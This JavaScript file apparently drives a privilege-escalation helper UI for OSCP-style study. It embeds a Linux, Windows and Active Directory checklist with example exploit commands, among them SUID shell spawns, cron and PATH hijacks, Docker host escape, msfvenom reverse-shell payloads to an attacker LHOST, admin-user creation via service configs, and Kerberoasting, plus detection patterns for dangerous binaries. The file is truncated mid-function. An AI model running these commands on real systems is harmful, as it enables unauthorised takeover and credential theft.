document.addEventListener('DOMContentLoaded', () => {
    console.log("Privesc Cockpit v2 (Graph-Based) Initializing...");

    // --- DOM References ---
    const nodeSelect = document.getElementById('node-select');
    const activeNodeInfoEl = document.getElementById('active-node-info');
    const outputTypeSelect = document.getElementById('output-type-select');
    const rawOutputInput = document.getElementById('raw-output-input');
    const parseOutputBtn = document.getElementById('parse-output-btn');
    const parsingLoadingEl = document.getElementById('parsing-loading');
    const parsingErrorEl = document.getElementById('parsing-error');
    const correlationLoadingEl = document.getElementById('correlation-loading');
    const correlationErrorEl = document.getElementById('correlation-error');
    const exploitationSuggestionsEl = document.getElementById('privesc-exploitation-suggestions');
    const detailsContentEl = document.getElementById('details-content');

    // Left Panel Tabs & Panes
    const leftPanelTabs = document.querySelectorAll('.left-panel-tab');
    const tabPanes = document.querySelectorAll('.tab-pane');
    const inputTab = document.getElementById('input-tab');
    const checklistTab = document.getElementById('checklist-tab');
    const findingsTab = document.getElementById('findings-tab');

    // Placeholder Buttons
    const loadPlaceholderSudoBtn = document.getElementById('load-placeholder-sudo');
    const loadPlaceholderSuidBtn = document.getElementById('load-placeholder-suid');
    const loadPlaceholderSysinfoBtn = document.getElementById('load-placeholder-sysinfo');
    const loadPlaceholderPrivBtn = document.getElementById('load-placeholder-priv');

    // --- State Variables ---
    let graphData = null; // Holds the entire graph { nodes: {...}, edges: [...] }
    let currentNodeId = null;
    let currentNodeData = null; // Holds the data for the selected node
    let parsedFindings = {}; // Store findings per node: { nodeId: { findingType: [...] } }
    let potentialVectors = []; // Suggestions for the current node
    let knowledgeBases = { gtfobins: null, lolbas: null, suspiciousPatterns: null };
    let checklists = { linux: null, windows: null }; // Store loaded checklists

    // --- Placeholder Data (Keep for buttons) ---
    const PLACEHOLDERS = {
        sudo: `Matching Defaults entries for user on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User user may run the following commands on this host:
    (ALL : ALL) NOPASSWD: /usr/bin/find
    (ALL) /usr/bin/vim
    (root) /usr/bin/nmap`,
        suid: `/usr/bin/find
/usr/bin/bash
/usr/bin/pkexec
/usr/sbin/unix_chkpwd
/tmp/vuln_suid`,
        systeminfo: `Nom de l'hôte:             DESKTOP-WIN10
Nom du système d'exploitation:   Microsoft Windows 10 Pro
Version du système:        10.0.19044 N/A build 19044
Type du système:           x64-based PC
Correctifs logiciels:      4 Correctif(s) installé(s).
                           [01]: KB5018410
                           [02]: KB5017380
                           [03]: KB4566782
                           [04]: KB4570334`,
        whoami_priv: `

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Arrêter le système                        Disabled
SeChangeNotifyPrivilege       Contourner la vérification de parcours    Enabled
SeUndockPrivilege             Supprimer l'ordinateur de la station d... Disabled
SeIncreaseWorkingSetPrivilege Augmenter l'espace de travail d'un pr... Disabled
SeTimeZonePrivilege           Modifier le fuseau horaire                Disabled
SeImpersonatePrivilege        Emprunter l'identité d'un client aprè... Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled`
    };

    // --- Checklist Data (Simplified - Could be externalized) ---
    const OSCP_PRIVESC_GUIDE = {
        linux: [
            {
                id: 'l1',
                label: 'Kernel Exploits',
                details: 'Vérifier la version du kernel et chercher des exploits locaux connus.',
                checked: false,
                enum: 'uname -a',
                exploit_guide: 'Utiliser searchsploit, chercher des CVE spécifiques. Compiler et exécuter l\'exploit (instable).',
                example_exploit: 'searchsploit Linux kernel 4.15'
            },
            {
                id: 'l2',
                label: 'Sudo Abuse',
                details: 'Examiner les permissions sudo de l\'utilisateur actuel.',
                checked: false,
                enum: 'sudo -l',
                exploit_guide: 'Utiliser GTFOBins pour identifier des commandes NOPASSWD permettant l\'évasion de privilèges.',
                example_exploit: 'sudo /usr/bin/nmap --interactive'
            },
            {
                id: 'l3',
                label: 'SUID/SGID Abuse',
                details: 'Rechercher les binaires avec les bits SUID/SGID activés.',
                checked: false,
                enum: 'find / -perm -u=s -type f 2>/dev/null; find / -perm -g=s -type f 2>/dev/null',
                exploit_guide: 'Utiliser GTFOBins pour trouver des moyens d\'abuser de ces binaires pour obtenir des privilèges élevés.',
                example_exploit: 'find . -name exploit -exec /bin/sh -p \; -quit (find SUID)'
            },
            {
                id: 'l4',
                label: 'Capabilities Abuse',
                details: 'Lister les capacités des fichiers.',
                checked: false,
                enum: 'getcap -r / 2>/dev/null',
                exploit_guide: 'Utiliser GTFOBins pour identifier les capacités dangereuses.',
                example_exploit: 'setcap cap_setuid+ep /tmp/evil_bin; /tmp/evil_bin'
            },
            {
                id: 'l5',
                label: 'Cron Job Abuse',
                details: 'Analyser les tâches cron pour les vulnérabilités.',
                checked: false,
                enum: 'ls -l /etc/cron*; cat /etc/crontab; for user in $(cut -d: -f1 /etc/passwd); do crontab -u "$user" -l 2>/dev/null; done',
                exploit_guide: 'Modifier les scripts writables ou exploiter les commandes non absolues.',
                example_exploit: 'echo \'chmod +s /bin/bash\' >> /etc/cron.daily/vulnerable_script'
            },
            {
                id: 'l6',
                label: 'Writable Files/Directories',
                details: 'Vérifier les permissions sur les fichiers sensibles et les répertoires.',
                checked: false,
                enum: 'ls -ld /etc/passwd /etc/shadow /etc/sudoers*; find / -perm -o+w -type f -print 2>/dev/null; find / -perm -o+w -type d -print 2>/dev/null; echo $PATH',
                exploit_guide: 'Modifier les fichiers si possible (rare). Exploiter $PATH. Créer des fichiers dans des répertoires writables utilisés par des processus privilégiés.',
                example_exploit: 'cd /tmp; echo \'#!/bin/bash\nchmod +s /bin/bash\' > update; chmod +x update; export PATH=/tmp:$PATH; sudo update'
            },
            {
                id: 'l7',
                label: 'NFS Abuse',
                details: 'Examiner les partages NFS.',
                checked: false,
                enum: 'showmount -e <target_ip>; cat /etc/exports',
                exploit_guide: 'Exploiter l\'option no_root_squash pour agir en tant que root sur le partage monté.',
                example_exploit: 'mount -t nfs <target_ip>:/ /mnt/nfs; chown root:root /mnt/nfs/evil; chmod +s /mnt/nfs/evil; /mnt/nfs/evil'
            },
            {
                id: 'l8',
                label: 'Docker Socket/Group Abuse',
                details: 'Vérifier l\'accès au socket Docker.',
                checked: false,
                enum: 'groups $USER; ls -l /var/run/docker.sock',
                exploit_guide: 'Utiliser Docker pour obtenir un accès root au système hôte.',
                example_exploit: 'sudo docker run -v /:/hostfs --rm -it alpine chroot /hostfs /bin/sh'
            },
            {
                id: 'l9',
                label: 'Exploiting PATH Variable',
                details: 'Si un répertoire dans votre PATH est writable, vous pouvez potentiellement exécuter des commandes privilégiées en plaçant un exécutable malveillant avec le même nom.',
                checked: false,
                enum: 'echo $PATH; find / -writable -type d -user $USER 2>/dev/null',
                exploit_guide: 'Identifier un répertoire writable dans PATH et y placer un exécutable malveillant.',
                example_exploit: 'cd /tmp; mkdir evilpath; echo \'#!/bin/bash\nchmod +s /bin/bash\' > evilpath/sudo; chmod +x evilpath/sudo; export PATH=/tmp/evilpath:$PATH; sudo -V'
            },
            {
                id: 'l10',
                label: 'Exploiting Environment Variables',
                details: 'Certains programmes privilégiés peuvent être influencés par des variables d\'environnement non sécurisées.',
                checked: false,
                enum: 'ps aux | grep <process_privilegie>; strings /proc/<pid>/environ',
                exploit_guide: 'Identifier les variables d\'environnement lues par un processus privilégié et tenter de les manipuler.',
                example_exploit: 'LD_PRELOAD=/tmp/evil.so privileged_program'
            },
            {
                id: 'l11',
                label: 'Abusing Shared Libraries',
                details: 'Si un programme privilégié charge des bibliothèques partagées avec des permissions d\'écriture, elles peuvent être remplacées.',
                checked: false,
                enum: 'ldd <programme_privilegie>; find / -name "<nom_lib>.so" -writable -user $USER 2>/dev/null',
                exploit_guide: 'Créer une bibliothèque partagée malveillante et la faire charger par le programme privilégié.',
                example_exploit: 'gcc -shared -fPIC evil.c -o evil.so; LD_PRELOAD=/tmp/evil.so privileged_program'
            },
            {
                id: 'l12',
                label: 'Exploiting Init Scripts/Services',
                details: 'Vérifier les scripts d\'initialisation ou les fichiers de configuration des services pour les vulnérabilités.',
                checked: false,
                enum: 'ls -l /etc/init.d/; cat /etc/init.d/*; ls -l /etc/systemd/system/; cat /etc/systemd/system/*.service',
                exploit_guide: 'Identifier les scripts ou fichiers de configuration writables ou ceux qui exécutent des commandes non sécurisées.',
                example_exploit: 'echo \'#!/bin/bash\nchmod +s /bin/bash\' > /etc/init.d/vulnerable_service; chmod +x /etc/init.d/vulnerable_service; service vulnerable_service start'
            },
            {
                id: 'l13',
                label: 'Abusing File System Permissions (ACLs)',
                details: 'Vérifier les Access Control Lists (ACLs) des fichiers et répertoires.',
                checked: false,
                enum: 'getfacl <fichier_ou_repertoire>',
                exploit_guide: 'Identifier les ACLs qui permettent à l\'utilisateur actuel de modifier des fichiers appartenant à d\'autres utilisateurs privilégiés.',
                example_exploit: 'setfacl -m u:$USER:rwx /chemin/fichier_privilegie; echo \'evil_command\' > /chemin/fichier_privilegie'
            },
            {
                id: 'l14',
                label: 'Exploiting Software Vulnerabilities (Local)',
                details: 'Rechercher les vulnérabilités dans les logiciels installés (autres que le kernel).',
                checked: false,
                enum: 'dpkg -l; rpm -qa',
                exploit_guide: 'Utiliser searchsploit ou des bases de données de vulnérabilités pour trouver des exploits locaux.',
                example_exploit: 'searchsploit <nom_du_logiciel> local privilege escalation'
            },
            {
                id: 'l15',
                label: 'Abusing Systemctl',
                details: 'Si l\'utilisateur a des droits sudo sur `systemctl`, il peut potentiellement escalader ses privilèges.',
                checked: false,
                enum: 'sudo -l | grep systemctl',
                exploit_guide: 'Utiliser `systemctl` pour exécuter des commandes privilégiées.',
                example_exploit: 'sudo systemctl start evil.service; cat evil.service (contenant une commande d\'escalade)'
            },
            {
                id: 'l16',
                label: 'Exploiting PAM (Pluggable Authentication Modules)',
                details: 'Des configurations PAM incorrectes peuvent potentiellement être exploitées.',
                checked: false,
                enum: 'ls -l /etc/pam.d/',
                exploit_guide: 'Analyser les fichiers de configuration PAM pour des faiblesses (rare).',
                example_exploit: 'Exploitation spécifique à une mauvaise configuration PAM (très contextuel).'
            },
            {
                id: 'l17',
                label: 'Abusing Mount Bindings',
                details: 'Si l\'utilisateur peut monter des répertoires sur des emplacements privilégiés.',
                checked: false,
                enum: 'cat /etc/fstab',
                exploit_guide: 'Monter un répertoire contrôlé par l\'utilisateur sur un emplacement privilégié et y placer des fichiers malveillants.',
                example_exploit: 'mount --bind /tmp /usr/bin; echo \'chmod +s /bin/bash\' > /usr/bin/bash'
            },
            {
                id: 'l18',
                label: 'Exploiting Open Redirects/SSRF (Local)',
                details: 'Certaines applications locales peuvent avoir des vulnérabilités d\'open redirect ou de SSRF qui peuvent être exploitées localement pour obtenir des informations ou exécuter des commandes.',
                checked: false,
                enum: 'ps aux | grep <application_locale>',
                exploit_guide: 'Analyser le comportement de l\'application locale.',
                example_exploit: 'Exploitation spécifique à l\'application (très contextuel).'
            },
            {
                id: 'l19',
                label: 'Abusing Package Managers',
                details: 'Si l\'utilisateur a des droits sudo pour exécuter le gestionnaire de paquets sans restrictions, cela peut mener à une escalade.',
                checked: false,
                enum: 'sudo -l | grep apt; sudo -l | grep yum',
                exploit_guide: 'Utiliser le gestionnaire de paquets pour exécuter des commandes privilégiées (e.g., en installant un package malveillant ou en exécutant des scripts de post-installation).',
                example_exploit: 'sudo apt install -y --force-yes /tmp/evil.deb'
            }
        ],
        windows: [
            {
                id: 'w1',
                label: 'System Information & Known Exploits',
                details: 'Vérifier la version de l\'OS, l\'architecture et les correctifs installés pour identifier les exploits locaux.',
                checked: false,
                enum: 'systeminfo',
                exploit_guide: 'Comparer la sortie avec WES-NG (Windows Exploit Suggester NG) hors ligne ou chercher des CVE spécifiques.',
                example_exploit: 'Utiliser WES-NG pour trouver des exploits basés sur les hotfixes manquants.'
            },
            {
                id: 'w2',
                label: 'Token Impersonation (SeImpersonatePrivilege)',
                details: 'Vérifier si l\'utilisateur a le privilège SeImpersonatePrivilege.',
                checked: false,
                enum: 'whoami /priv',
                exploit_guide: 'Utiliser des exploits comme Juicy Potato, Rotten Potato, PrintSpoofer pour usurper les tokens d\'autres utilisateurs (souvent SYSTEM).',
                example_exploit: '.\JuicyPotato.exe -l 9999 -p c:\\windows\\temp\\evil.exe -t * -c {CLSID}'
            },
            {
                id: 'w3',
                label: 'Backup Operators Privilege (SeBackupPrivilege)',
                details: 'Vérifier si l\'utilisateur est membre du groupe Backup Operators.',
                checked: false,
                enum: 'net user <username>; net localgroup "Backup Operators"',
                exploit_guide: 'Les membres de Backup Operators peuvent lire les fichiers protégés par le système, y compris les hives du registre (SAM, SYSTEM).',
                example_exploit: 'Utiliser des outils comme NTBackup ou des scripts PowerShell pour copier les hives du registre.'
            },
            {
                id: 'w4',
                label: 'Unquoted Service Paths',
                details: 'Identifier les services avec des chemins non entre guillemets contenant des espaces.',
                checked: false,
                enum: 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\\\Windows\\\\" | findstr /i /v """',
                exploit_guide: 'Placer un exécutable malveillant dans un répertoire parent du chemin du service.',
                example_exploit: 'msfvenom -p windows/shell_reverse_tcp LHOST=<IP_KALI> LPORT=<PORT> -f exe -o "C:\\Program Files\\Sous-dossier.exe" (si le chemin est C:\\Program Files\\Sous-dossier\\Service.exe)'
            },
            {
                id: 'w5',
                label: 'Weak Service Permissions',
                details: 'Vérifier les permissions sur les services.',
                checked: false,
                enum: '.\accesschk.exe -uwcqv "Authenticated Users" * /accepteula',
                exploit_guide: 'Modifier le chemin d\'exécution d\'un service si l\'utilisateur a les droits (SERVICE_CHANGE_CONFIG).',
                example_exploit: 'sc config <ServiceName> binPath= "net user exploit Password123 /add && net localgroup Administrators exploit /add && net start <ServiceName>"'
            },
            {
                id: 'w6',
                label: 'AlwaysInstallElevated',
                details: 'Vérifier si la politique AlwaysInstallElevated est activée.',
                checked: false,
                enum: 'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
                exploit_guide: 'Créer et exécuter un fichier MSI malveillant pour exécuter des commandes avec les privilèges SYSTEM.',
                example_exploit: 'msfvenom -p windows/exec CMD="net user exploit Password123 /add && net localgroup Administrators exploit /add" -f msi -o evil.msi; msiexec /i evil.msi'
            },
            {
                id: 'w7',
                label: 'Stored Credentials',
                details: 'Rechercher les informations d\'identification stockées.',
                checked: false,
                enum: 'reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions; reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon; dir /a %APPDATA%\\Microsoft\\Windows\\PowerShell\\History.txt; cmdkey /list',
                exploit_guide: 'Utiliser les informations d\'identification trouvées pour l\'usurpation d\'identité ou la connexion à d\'autres systèmes.',
                example_exploit: 'runas /user:<username> <command>'
            },
            {
                id: 'w8',
                label: 'DLL Hijacking',
                details: 'Identifier et exploiter les vulnérabilités de détournement de DLL.',
                checked: false,
                enum: 'Utiliser Process Monitor (ProcMon) pour identifier les DLL manquantes.',
                exploit_guide: 'Créer une DLL malveillante avec le nom de la DLL manquante et la placer dans un emplacement où l\'application privilégiée la chargera en premier.',
                example_exploit: 'msfvenom -p windows/dll/reverse_tcp LHOST=<IP_KALI> LPORT=<PORT> -f dll -o hijack.dll'
            },
            {
                id: 'w9',
                label: 'Group Memberships',
                details: 'Vérifier l\'appartenance à des groupes privilégiés.',
                checked: false,
                enum: 'net user <username>; net localgroup',
                exploit_guide: 'Exploiter les droits associés aux groupes (e.g., Remote Desktop Users, Distributed COM Users).',
                example_exploit: 'Si membre de "Remote Desktop Users", activer RDP si désactivé.'
            },
            {
                id: 'w10',
                label: 'Network Shares Permissions',
                details: 'Examiner les permissions sur les partages réseau.',
                checked: false,
                enum: 'net share; Get-SmbShare | Get-SmbShareAccess',
                exploit_guide: 'Écrire des exécutables ou modifier des fichiers sur des partages accessibles en écriture qui sont utilisés par des processus privilégiés.',
                example_exploit: 'copy evil.exe \\\\<target>\\<share>'
            },
            {
                id: 'w11',
                label: 'Scheduled Tasks',
                details: 'Lister et analyser les tâches planifiées.',
                checked: false,
                enum: 'schtasks /query /fo LIST /v; Get-ScheduledTask | Select-Object TaskName, TaskPath, Author, RunLevel, Principal',
                exploit_guide: 'Modifier des tâches planifiées si l\'utilisateur a les droits d\'écriture sur le fichier exécutable ou le script associé.',
                example_exploit: 'Remplacer le binaire d\'une tâche planifiée s\'exécutant en tant que SYSTEM par un payload malveillant.'
            },
            {
                id: 'w12',
                label: 'Registry Permissions',
                details: 'Vérifier les permissions sur les clés de registre sensibles.',
                checked: false,
                enum: '.\accesschk.exe -kqv "Everyone" HKLM\\System\\CurrentControlSet\\Services; Get-Acl -Path "HKLM:\\System\\CurrentControlSet\\Services\\<ServiceName>" | Format-List',
                exploit_guide: 'Modifier des clés de registre pour exécuter des commandes privilégiées (e.g., modifier ImagePath d\'un service).',
                example_exploit: 'reg add "HKLM\\System\\CurrentControlSet\\Services\\<ServiceName>" /v ImagePath /t REG_EXPAND_SZ /d "net user exploit Password123 /add && net localgroup Administrators exploit /add && net start <ServiceName>" /f'
            },
            {
                id: 'w13',
                label: 'COM Object Hijacking',
                details: 'Identifier et exploiter les détournements d\'objets COM.',
                checked: false,
                enum: 'reg query HKCR\\CLSID /s /f InprocServer32',
                exploit_guide: 'Remplacer le chemin d\'une DLL pour un objet COM invoqué par une application privilégiée.',
                example_exploit: 'reg add HKCR\\CLSID\\{CLSID_VULNERABLE}\\InprocServer32 /ve /t REG_SZ /d "C:\\path\\to\\evil.dll" /f'
            },
            {
                id: 'w14',
                label: 'PowerShell Remoting Abuse',
                details: 'Si PowerShell Remoting est activé, des informations d\'identification compromises peuvent être utilisées pour l\'exécution à distance.',
                checked: false,
                enum: 'Get-PSSessionConfiguration',
                exploit_guide: 'Utiliser Enter-PSSession avec des informations d\'identification valides.',
                example_exploit: 'Enter-PSSession -ComputerName <target> -Credential <creds>'
            },
            {
                id: 'w15',
                label: 'Local Group Policy Abuse',
                details: 'Examiner les stratégies de groupe locales.',
                checked: false,
                enum: 'gpresult /r',
                exploit_guide: 'Identifier les paramètres de stratégie de groupe locaux qui pourraient être exploités (e.g., scripts de démarrage).',
                example_exploit: 'Modifier des scripts de démarrage locaux si les permissions le permettent.'
            }
        ],
        activeDirectory: {
            guide: "L'escalade de privilèges dans Active Directory (AD) se concentre sur l'exploitation des mauvaises configurations, des permissions excessives et des vulnérabilités au sein du domaine. Une énumération approfondie avec des outils comme `BloodHound`, les cmdlets PowerShell AD et `ldapsearch` est essentielle.",
            techniques: [
                {
                    name: 'Group Policy Abuse (GPO)',
                    enum: 'gpresult /r (sur la machine cible jointe au domaine); Get-GPO -All (avec les outils RSAT)',
                    details: 'Identifier les GPOs appliquées à l\'utilisateur ou à la machine. Rechercher les GPOs modifiables par des utilisateurs à bas privilèges qui peuvent être utilisés pour exécuter des scripts malveillants (Computer Startup Scripts, User Logon Scripts).',
                    exploit_guide: 'Modifier un GPO writable pour exécuter un script malveillant. Cela nécessite souvent les outils RSAT.',
                    example_exploit: 'Utiliser `Set-GPO` pour modifier les paramètres d\'un GPO et y ajouter un script de démarrage malveillant.'
                },
                {
                    name: 'Password Reuse (Local -> Domain)',
                    details: 'Essayer les mots de passe locaux compromis sur les comptes de domaine.',
                    exploit_guide: 'Utiliser des outils comme `CrackMapExec` pour tester les identifiants sur différents services et machines du domaine (SMB, WinRM, etc.).',
                    enum: 'N/A (nécessite des identifiants locaux compromis)'
                },
                {
                    name: 'Kerberoasting',
                    enum: 'GetUserSPNs -request (avec PowerView); Rubeus.exe kerberoast /domain:<domain> /user:<user> /outfile:hashes.txt',
                    details: 'Demander des tickets Kerberos pour les Service Principal Names (SPNs). Les hashs TGS peuvent être crackés hors ligne pour obtenir les mots de passe des comptes de service, qui peuvent avoir des privilèges élevés.',
                    exploit_guide: 'Utiliser `hashcat` ou `John the Ripper` pour cracker les hashs TGS extraits avec les outils d\'énumération.',
                    example_exploit: 'hashcat -m 13100 hashes.txt wordlist.txt'
                },
                {
                    name: 'AS-REP Roasting',
                    enum: 'Get-DomainUser -PreauthNotRequired | select samaccountname (avec PowerView); Rubeus.exe asreproast /domain:<domain> /format:john /outfile:hashes.txt',
                    details: 'Identifier les utilisateurs dont l\'option "Do not require Kerberos pre-authentication" est activée. Leurs hashs Kerberos peuvent être demandés sans mot de passe et crackés hors ligne.',
                    exploit_guide: 'Utiliser `hashcat` ou `John the Ripper` pour cracker les hashs AS-REP extraits.',
                    example_exploit: 'john --format=krb5asrep hashes.txt --wordlist=password.lst'
                },
                {
                    name: 'ACL Abuse (Permissions sur les objets AD)',
                    enum: 'Get-ObjectAcl -Identity "<DN_Objet_AD>" | Format-List (avec PowerView); ldapsearch -x -h <dc_ip> -D "<user>@<domain>" -w "<password>" -b "<base_dn>" -s sub "(objectClass=*)" dacl',
                    details: 'Examiner les Access Control Lists (ACLs) sur les objets AD (utilisateurs, groupes, GPOs, OUs). Rechercher les permissions d\'écriture ou de contrôle excessives accordées à des utilisateurs à bas privilèges qui pourraient permettre de modifier des attributs sensibles.',
                    exploit_guide: 'Modifier les attributs d\'objets AD si les permissions le permettent (e.g., ajouter un utilisateur à un groupe privilégié). Utiliser des outils comme `Set-ObjectAcl` (PowerView) ou des requêtes LDAP modifiées.',
                    example_exploit: 'Set-ObjectAcl -TargetIdentity "CN=LowPrivUser,CN=Users,DC=domain,DC=com" -PrincipalIdentity "<user_sid>" -Rights "WriteProperty" -Properties member -AceType "Allow"'
                },
                {
                    name: 'Exploitation des relations de confiance (Trusts)',
                    details: 'Si le domaine actuel a des relations de confiance avec d\'autres domaines, il peut être possible d\'exploiter ces relations pour obtenir un accès privilégié dans le domaine actuel (Cross-Domain Attacks).',
                    exploit_guide: 'Utiliser des outils comme `Mimikatz` pour générer des tickets inter-domaines si des identifiants d\'un domaine de confiance ont été compromis. Énumérer les relations de confiance avec `nltest /domain_trusts`.',
                    enum: 'nltest /domain_trusts'
                },
                {
                    name: 'SID History Injection',
                    details: 'Si un attaquant contrôle un compte dans un domaine de confiance, il peut potentiellement injecter l\'historique des SID d\'un groupe privilégié dans le compte compromis, lui accordant ainsi des privilèges dans le domaine actuel.',
                    exploit_guide: 'Utiliser des outils comme `Mimikatz` pour injecter l\'historique des SID.',
                    enum: 'N/A (nécessite un compte compromis dans un domaine de confiance)'
                },
                {
                    name: 'Golden Ticket',
                    details: 'Si la clé KRBTGT du domaine est compromise, un attaquant peut forger des tickets Kerberos (TGT) pour n\'importe quel utilisateur, y compris Administrator.',
                    exploit_guide: 'Nécessite l\'obtention de la clé KRBTGT (souvent via Mimikatz sur un contrôleur de domaine compromis). Utiliser des outils comme `Mimikatz` pour forger le Golden Ticket.',
                    enum: 'N/A (nécessite une compromission préalable du contrôleur de domaine)'
                },
                {
                    name: 'Silver Ticket',
                    details: 'Similaire au Golden Ticket, mais au lieu de forger un TGT pour n\'importe quel utilisateur, un Silver Ticket forge un TGS pour un service spécifique (e.g., CIFS sur un serveur). Nécessite le hash du compte de service.',
                    exploit_guide: 'Obtenir le hash du compte de service (via Mimikatz ou Kerberoasting) et utiliser des outils comme `Mimikatz` pour forger le Silver Ticket.',
                    enum: 'GetUserSPNs -request (pour identifier les comptes de service)'
                },
                {
                    name: 'DCShadow',
                    details: 'Une technique qui permet à un attaquant avec des privilèges suffisants dans le domaine de pousser des modifications malveillantes à Active Directory en enregistrant un contrôleur de domaine malveillant.',
                    exploit_guide: 'Utiliser des outils comme `Impacket` pour effectuer une attaque DCShadow.',
                    enum: 'N/A (nécessite des privilèges spécifiques dans le domaine)'
                },
                {
                    name: 'DCSync',
                    details: 'Une technique utilisée par les attaquants pour récupérer les hashs de mot de passe de tous les utilisateurs du domaine en se faisant passer pour un contrôleur de domaine légitime.',
                    exploit_guide: 'Utiliser des outils comme `Mimikatz` pour effectuer une attaque DCSync. Nécessite des privilèges élevés dans le domaine (souvent Domain Admins ou équivalent).',
                    enum: 'N/A (nécessite des privilèges élevés dans le domaine)'
                }
            ]
        }
    };

    // --- Suspicious Patterns Definition ---
    const SUSPICIOUS_PATTERNS = {
        sudo: [
            { name: "NOPASSWD", regex: /NOPASSWD:/i, risk: 'High', message: "Exécution sans mot de passe !" },
            { name: "Known Dangerous Sudo Binary", regex: /\/(bash|sh|python|perl|ruby|php|find|vim|nmap|pkexec|apt|docker)$/i, risk: 'Medium', message: "Binaire potentiellement dangereux via sudo." }
        ],
        suid: [
            { name: "Non Standard Path SUID", condition: (path) => !/^\/(usr\/bin|usr\/sbin|bin|sbin)\//.test(path), risk: 'Medium', message: "SUID dans un chemin non standard." },
            { name: "Known Dangerous SUID", condition: (path) => /\/(bash|sh|python|perl|ruby|php|find|vim|nmap|pkexec)$/.test(path), risk: 'High', message: "Binaire potentiellement dangereux avec SUID." }
        ],
        capabilities: [
             { name: "Dangerous Capability", condition: (capLine) => /cap_sys_admin|cap_setuid|cap_setgid/i.test(capLine), risk: 'High', message: "Capacité dangereuse détectée." }
        ],
        windowsPrivileges: [
            { name: "SeImpersonatePrivilege", condition: (priv) => priv.name === 'SeImpersonatePrivilege' && priv.status === 'Enabled', risk: 'High', message: "Permet l'usurpation (JuicyPotato, PrintSpoofer...)" },
            { name: "SeAssignPrimaryTokenPrivilege", condition: (priv) => priv.name === 'SeAssignPrimaryTokenPrivilege' && priv.status === 'Enabled', risk: 'High', message: "Permet de créer des tokens arbitraires." },
            { name: "SeBackupPrivilege", condition: (priv) => priv.name === 'SeBackupPrivilege' && priv.status === 'Enabled', risk: 'Medium', message: "Permet de lire n'importe quel fichier (SAM, NTDS.dit)." },
            { name: "SeDebugPrivilege", condition: (priv) => priv.name === 'SeDebugPrivilege' && priv.status === 'Enabled', risk: 'Medium', message: "Permet d'injecter dans des processus (ex: lsass)." },
            { name: "SeTakeOwnershipPrivilege", condition: (priv) => priv.name === 'SeTakeOwnershipPrivilege' && priv.status === 'Enabled', risk: 'Medium', message: "Permet de prendre possession de fichiers/clés registre." },
        ],
        // Add patterns for Windows services, Cron jobs, etc. later
    };

    // --- Initialization ---
    async function initialize() {
        console.log("Initializing Privesc Cockpit...");
        showLoadingIndicator(true, 'global'); // Indicateur global si nécessaire

        // Vérifier que tous les éléments DOM essentiels sont présents
        if (!nodeSelect || !activeNodeInfoEl || !parseOutputBtn || !parsingLoadingEl || !exploitationSuggestionsEl || !detailsContentEl || !checklistTab || !findingsTab) {
            console.error("CRITICAL ERROR: One or more essential DOM elements are missing. Aborting initialization.");
            displayCriticalError("Erreur critique: Impossible d'initialiser l'interface. Vérifiez la structure HTML et les IDs.");
            showLoadingIndicator(false, 'global');
            return; // Arrêter l'initialisation
        }

        setupEventListeners();
        try {
            await loadKnowledgeBases();
            await loadGraphData(); // Charge le graphe et peuple le sélecteur
            // Pas besoin de charger la checklist ici, elle se charge à la sélection du node
        } catch (error) {
            console.error("Initialization failed:", error);
            displayCriticalError(`Erreur d'initialisation: ${error.message}`);
        } finally {
            showLoadingIndicator(false, 'global');
        }
        console.log("Initialization complete.");
    }

    function displayCriticalError(message) {
        // Crée un élément pour afficher l'erreur en haut de la page
        let errorBanner = document.getElementById('critical-error-banner');
        if (!errorBanner) {
            errorBanner = document.createElement('div');
            errorBanner.id = 'critical-error-banner';
            errorBanner.className = 'critical-error'; // Utiliser la classe CSS définie
            document.body.prepend(errorBanner); // Ajoute en haut du body
        }
        errorBanner.textContent = message;
    }

    // --- Event Listeners Setup ---
    function setupEventListeners() {
        console.log("Setting up event listeners...");
        nodeSelect.addEventListener('change', handleNodeSelection);
        parseOutputBtn.addEventListener('click', parseRawOutput);

        // Placeholder buttons listeners
        loadPlaceholderSudoBtn.addEventListener('click', () => loadPlaceholder('sudo'));
        loadPlaceholderSuidBtn.addEventListener('click', () => loadPlaceholder('suid'));
        loadPlaceholderSysinfoBtn.addEventListener('click', () => loadPlaceholder('systeminfo'));
        loadPlaceholderPrivBtn.addEventListener('click', () => loadPlaceholder('whoami_priv'));

        // Use event delegation for checklist items
        const checklistContainer = document.getElementById('checklist-tab'); // Cibler le div interne
        if(checklistContainer) {
            checklistContainer.addEventListener('change', handleChecklistChange);
        } else {
             console.error("Checklist container #checklist-tab not found for event listener setup.");
        }


        // Use event delegation for suggestion clicks
        exploitationSuggestionsEl.addEventListener('click', (event) => {
            const card = event.target.closest('.suggestion-card');
            if (card && card.dataset.vectorIndex !== undefined) {
                const index = parseInt(card.dataset.vectorIndex, 10);
                if (!isNaN(index) && potentialVectors[index]) {
                    displayDetails(potentialVectors[index], currentNodeData);
                    // Highlight selected card
                    document.querySelectorAll('.suggestion-card.selected').forEach(c => c.classList.remove('selected'));
                    card.classList.add('selected');
                }
            }
        });

         // Use event delegation for copy buttons inside the details panel
         detailsContentEl.addEventListener('click', (event) => {
             if (event.target.matches('.copy-btn') || event.target.closest('.copy-btn')) {
                 const button = event.target.closest('.copy-btn');
                 window.copyToClipboard(button); // Call the global copy function
             }
         });

        // Tab switching logic (if using Bootstrap JS tabs, this might not be needed)
        // If Bootstrap handles it, remove this. If not, keep it.
        const tabButtons = document.querySelectorAll('#left-panel-tab-nav .nav-link');
        tabButtons.forEach(button => {
            button.addEventListener('shown.bs.tab', event => { // Use Bootstrap event
                const targetTabId = event.target.getAttribute('data-bs-target');
                console.log(`Tab shown: ${targetTabId}`);
                // Add any logic needed when a tab becomes visible
            });
        });


        console.log("Event listeners setup complete.");
    }

    // --- Data Loading ---
    async function loadGraphData() {
        console.log("Loading graph data...");
        try {
            // A terme: remplacer par fetch('/api/hostmanager/graph')
            const response = await fetch('/assets/data/hostmanager_graph_export.json');
